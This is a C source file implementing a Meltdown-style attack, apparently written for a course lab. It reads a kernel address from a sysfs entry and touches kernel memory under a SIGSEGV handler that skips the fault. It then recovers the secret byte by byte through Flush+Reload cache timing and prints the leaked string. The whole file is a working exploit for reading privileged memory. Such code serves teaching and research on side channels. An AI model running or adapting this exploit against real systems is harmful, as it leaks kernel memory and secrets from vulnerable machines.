#include <inttypes.h>
#include <unistd.h>
#define __USE_GNU
#include <signal.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "util.h"

const uint64_t MAX_CHOICE = 256;
const uint64_t TRIALS = 100;
const double MIN_RATIO = 3.0;

extern char label[];

/* Returns the address stored in the file. */
void *get_kernel_data_address() {
    void *p;

    FILE *f = fopen("/sys/kernel/kernel_data/address", "r");
    int j = fscanf(f, "%p", &p);
    (void)j;
    fclose(f);
    return p;
}

/* Returns the length of the secret string stored in the file. */
size_t get_kernel_data_length() {
    size_t i;

    FILE *f = fopen("/sys/kernel/kernel_data/length", "r");
    int j = fscanf(f, "%zu", &i);
    (void)j;
    fclose(f);
    return i;
}

page_t *init_pages() {
    page_t *p = malloc(sizeof(page_t) * MAX_CHOICE);
    for (size_t i = 0; i < MAX_CHOICE; i++) {
        p[i][0] = 1;
    }
    return p;
}

void do_access(page_t *probe_array, size_t idx) {
    char* x = get_kernel_data_address();
    force_read(&probe_array[(int)x[idx]]);
}

static void sigsegv_handler(int signum, siginfo_t *siginfo, void *context) {
    (void)signum;
    (void)siginfo;
    ucontext_t *ucontext = (ucontext_t *)context;
    ucontext->uc_mcontext.gregs[REG_RIP] = (greg_t)label;
}

void flush(page_t *pages) {
    for (size_t i = 0; i < MAX_CHOICE; i++) {
        flush_cache_line(&pages[i]);
    }
}

int guess_accessed_page(page_t *pages, size_t str_idx) {
    int all_freq[MAX_CHOICE];
    int previous_hit_index = 256;

    /* zero out the array */
    for (int k = 0; (uint64_t)k < MAX_CHOICE; k++) {
        all_freq[k] = 0;
    }

    for (int k = 0; (uint64_t)k < TRIALS;) {
		/* 
		 * if a hit is recorded when it is false, then the toggle turns to true
		 * if a hit is recorded when it is true, then you have multiple hits
		 */
        bool toggle = false;
    	flush(pages);
        do_access(pages, str_idx);
        asm volatile("label:");

    	for (int i = 1; (uint64_t)i < MAX_CHOICE; i++) {
            uint64_t t1 = time_read(&pages[i]);
            uint64_t t2 = time_read(&pages[i]);
            double r = (double)t1 / (double)t2;
    		if (r < MIN_RATIO) {
                /*
				 * Method to filter out "bad" trials
				 *
				 * there are three cases:
                 *   1. no hits - a dumb trial, but it doesn't affect the array
                 *   2. one hit - this is what you want-- increment k
                 *   3. multiple hits - noise, so you decrement k
				 */
                if (!toggle) {
                    toggle = !toggle;
                    previous_hit_index = i;
                    all_freq[i]++;
                    k++;
                }
                else {
                    // discard the pevious hit index count
                    all_freq[previous_hit_index]--;

                    // terminate the trial
                    k--;
                    break;
                }
    		}
    	}
    }
	/*
	 * After all_freq has been populated, search through it to find the "most
	 * popular" index and return that.
	 */
    int max_freq = 0;
    int max_idx = -1;
    for (uint64_t i = 0; i < MAX_CHOICE; i++) {
        if (all_freq[i] > max_freq) {
            max_freq = all_freq[i];
            max_idx = i;
        }
    }
	return max_idx;
}

int main() {
    struct sigaction act = {
        .sa_sigaction = sigsegv_handler,
        .sa_flags = SA_SIGINFO
    };
    sigaction(SIGSEGV, &act, NULL);

    page_t *probe_array = init_pages();

    for (size_t i = 0; i < get_kernel_data_length(); i++) {
        int guess = guess_accessed_page(probe_array, i);
        printf("%c", (char)guess);
        fflush(stdout);
    }
	printf("\n");
}
